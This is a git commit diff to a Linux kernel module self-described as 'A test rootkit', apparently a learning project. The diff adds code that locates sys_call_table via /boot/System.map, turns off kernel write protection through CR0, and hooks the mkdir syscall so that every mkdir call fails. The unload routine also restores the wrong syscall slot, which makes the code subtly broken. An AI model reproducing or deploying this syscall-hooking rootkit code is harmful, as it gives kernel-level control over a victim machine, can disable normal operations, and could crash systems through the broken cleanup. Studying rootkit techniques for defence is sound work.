b083896f3cc44ff98c667b3977552783486c95a9
Alex Caceres <aclinux30@gmail.com>
2016-10-25 00:21:49 -0400

    functioning mkdir hook

--- rootkit.c
+++ rootkit.c
@@ -12,33 +12,25 @@
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("A test rootkit");
 
+#define MAX_VERSION_LEN 256
+#define BOOT_PATH "/boot/System.map-"
+
+unsigned long *syscall_table = NULL;
+asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);
+
 char * get_map_file(void) {
 
-  int MAX_FILESIZE;
-  MAX_FILESIZE = 100;
   char base_filename[] = "/boot/System.map-";
   char * kernel_release = utsname()->release;
-  char * kernel_release_buff = kmalloc(MAX_FILESIZE, GFP_KERNEL);
+  char * kernel_release_buff = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);
 
   //char * strncat (char * dest, const char * src, size_t count);
-  strncpy(kernel_release_buff, base_filename, sizeof(base_filename));
-  strncat (kernel_release_buff, kernel_release, 99);
+  strncpy(kernel_release_buff, BOOT_PATH, sizeof(base_filename));
+  strncat (kernel_release_buff, kernel_release, MAX_VERSION_LEN);
 
   printk(KERN_WARNING "Kernel release %s\n", kernel_release_buff);
 
   return kernel_release_buff;
-}
-
-void find_sys_call_table(char * map_filename, size_t map_filename_size) {
-
-  struct file *f;
-
-  mm_segment_t oldfs;
-  oldfs = get_fs();
-  set_fs(KERNEL_DS);
-
-  printk(KERN_WARNING "%s\n", map_filename);
-
 }
 
 
@@ -47,16 +39,117 @@ void free_map_file(char * map_file) {
 }
 
 
-static int __init hello_init(void) {
+int find_sys_call_table(char * filename) {
 
-  get_map_file();
+  printk(KERN_WARNING "Filename passed in: %s", filename);
+  char system_map_entry[MAX_VERSION_LEN];
+  struct file *f = NULL;
+  int i = 0;
+
+  mm_segment_t oldfs;
+  oldfs = get_fs();
+  set_fs(KERNEL_DS);
+
+  printk(KERN_WARNING "in sys_call_table after the kmalloc");
+
+  f = filp_open(filename, O_RDONLY, 0);
+  printk(KERN_WARNING "after filp_open");
+  if (IS_ERR(f) || (f == NULL)) {
+      printk(KERN_EMERG "Error opening System.map- file: %s\n", filename);
+      return -1;
+  }
+
+  while (vfs_read(f, system_map_entry + i, 1, &f->f_pos) == 1) {
+
+    if ( system_map_entry[i] == '\n' || i == MAX_VERSION_LEN ) {
+        // Reset the "column"/"character" counter for the row
+        i = 0;
+
+        if (strstr(system_map_entry, "sys_call_table") != NULL) {
+            char *sys_string;
+            char *system_map_entry_ptr = system_map_entry;
+
+            sys_string = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);
+            if (sys_string == NULL) {
+                filp_close(f, 0);
+                set_fs(oldfs);
+                kfree(filename);
+
+                return -1;
+            }
+
+            memset(sys_string, 0, MAX_VERSION_LEN);
+            strncpy(sys_string, strsep(&system_map_entry_ptr, " "), MAX_VERSION_LEN);
+
+            //syscall_table = (unsigned long long *) kstrtoll(sys_string, NULL, 16);
+            //syscall_table = kmalloc(sizeof(unsigned long *), GFP_KERNEL);
+            //syscall_table = kmalloc(sizeof(syscall_table), GFP_KERNEL);
+            kstrtoul(sys_string, 16, &syscall_table);
+            printk(KERN_EMERG "syscall_table retrieved:  \n");
+
+            kfree(sys_string);
+
+            break;
+        }
+
+        memset(system_map_entry, 0, MAX_VERSION_LEN);
+        continue;
+    }
+
+    i++;
+  }
+
+  filp_close(f, 0);
+  set_fs(oldfs);
+
+  free_map_file(filename);
+
+  //printk(KERN_WARNING "syscall table at: %lld", syscall_table);
+  return 0;
+}
+
+//asmlinkage long sys_mkdir(const char __user *pathname, umode_t mode);
+asmlinkage int new_mkdir (const char __user *pathname, umode_t mode) {
+    printk(KERN_EMERG "[+] mkdir be hooked muhfukka, can't mk nothing!");
+    return 0;
+
+    //return original_mkdir(pathname, mode);
+}
+
+
+static int __init root_init(void) {
+
+  //correctly populates the syscall_table pointer
+  find_sys_call_table(get_map_file());
+  printk(KERN_EMERG "Syscall table address: %p\n", syscall_table);
+
+  if (syscall_table != NULL) {
+      write_cr0 (read_cr0 () & (~ 0x10000));
+      original_write = (void *)syscall_table[__NR_mkdir];
+      syscall_table[__NR_mkdir] = &new_mkdir;
+      write_cr0 (read_cr0 () | 0x10000);
+      printk(KERN_EMERG "[+] onload: sys_call_table hooked\n");
+  } else {
+      printk(KERN_EMERG "[-] onload: syscall_table is NULL\n");
+  }
+
   return 0;
 }
 
 
-static void __exit hello_cleanup(void) {
+static void __exit root_cleanup(void) {
   printk(KERN_INFO "Cleaning up module.\n");
+  if (syscall_table != NULL) {
+      write_cr0 (read_cr0 () & (~ 0x10000));
+      syscall_table[__NR_write] = original_write;
+      write_cr0 (read_cr0 () | 0x10000);
+      printk(KERN_EMERG "[+] onunload: sys_call_table unhooked\n");
+  } else {
+      printk(KERN_EMERG "[-] onunload: syscall_table is NULL\n");
+  }
+  printk(KERN_INFO "Goodbye cruel world!\n");
 }
 
-module_init(hello_init);
-module_exit(hello_cleanup);
+
+module_init(root_init);
+module_exit(root_cleanup);
--- rootkit.mod.c
+++ rootkit.mod.c
@@ -17,16 +17,23 @@ __attribute__((section(".gnu.linkonce.this_module"))) = {
 static const struct modversion_info ____versions[]
 __used
 __attribute__((section("__versions"))) = {
-	{ 0xc6c01fa, __VMLINUX_SYMBOL_STR(module_layout) },
-	{ 0x37a0cba, __VMLINUX_SYMBOL_STR(kfree) },
-	{ 0x3356b90b, __VMLINUX_SYMBOL_STR(cpu_tss) },
+	{ 0xe89b6b83, __VMLINUX_SYMBOL_STR(module_layout) },
+	{ 0xe903b081, __VMLINUX_SYMBOL_STR(pv_cpu_ops) },
 	{ 0xdb7305a1, __VMLINUX_SYMBOL_STR(__stack_chk_fail) },
-	{ 0x27e1a049, __VMLINUX_SYMBOL_STR(printk) },
-	{ 0x2e2b40d2, __VMLINUX_SYMBOL_STR(strncat) },
+	{ 0x3c80c06c, __VMLINUX_SYMBOL_STR(kstrtoull) },
 	{ 0x9166fada, __VMLINUX_SYMBOL_STR(strncpy) },
-	{ 0xb7afaf64, __VMLINUX_SYMBOL_STR(kmem_cache_alloc_trace) },
-	{ 0x94d77f1e, __VMLINUX_SYMBOL_STR(current_task) },
-	{ 0xb4606292, __VMLINUX_SYMBOL_STR(kmalloc_caches) },
+	{ 0x85df9b6c, __VMLINUX_SYMBOL_STR(strsep) },
+	{ 0x68e7fdf8, __VMLINUX_SYMBOL_STR(filp_close) },
+	{ 0x1e6d26a8, __VMLINUX_SYMBOL_STR(strstr) },
+	{ 0x94f50ae4, __VMLINUX_SYMBOL_STR(vfs_read) },
+	{ 0x64076b33, __VMLINUX_SYMBOL_STR(filp_open) },
+	{ 0x3356b90b, __VMLINUX_SYMBOL_STR(cpu_tss) },
+	{ 0x37a0cba, __VMLINUX_SYMBOL_STR(kfree) },
+	{ 0x2e2b40d2, __VMLINUX_SYMBOL_STR(strncat) },
+	{ 0xb14f552d, __VMLINUX_SYMBOL_STR(kmem_cache_alloc_trace) },
+	{ 0x8b81418e, __VMLINUX_SYMBOL_STR(current_task) },
+	{ 0xe44e3f36, __VMLINUX_SYMBOL_STR(kmalloc_caches) },
+	{ 0x27e1a049, __VMLINUX_SYMBOL_STR(printk) },
 	{ 0xbdfb6dbb, __VMLINUX_SYMBOL_STR(__fentry__) },
 };
 
@@ -36,4 +43,4 @@ __attribute__((section(".modinfo"))) =
 "depends=";
 
 
-MODULE_INFO(srcversion, "C48E0C3E09652B4DD299A3D");
+MODULE_INFO(srcversion, "D9CD774DCB694DE60D58A45");
